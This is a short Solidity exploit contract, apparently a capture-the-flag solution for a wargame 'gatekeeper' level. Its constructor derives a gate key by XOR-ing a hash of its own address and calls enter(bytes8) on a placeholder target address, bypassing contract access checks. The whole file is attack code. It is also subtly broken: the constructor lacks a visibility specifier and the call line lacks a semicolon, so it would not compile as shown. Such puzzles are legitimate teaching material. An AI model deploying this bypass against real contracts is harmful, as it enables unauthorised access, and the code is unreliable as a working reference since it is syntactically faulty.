pragma solidity ^0.6.0;

contract gateBreaker2 {
  constructor() {
    address _vAddr = address(<YOUR INSTANCE ADDRESS>);
    // XOR is reversible
    uint64 _gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1;
    _vAddr.call(abi.encodeWithSignature("enter(bytes8)", bytes8(_gateKey)))

  }
}
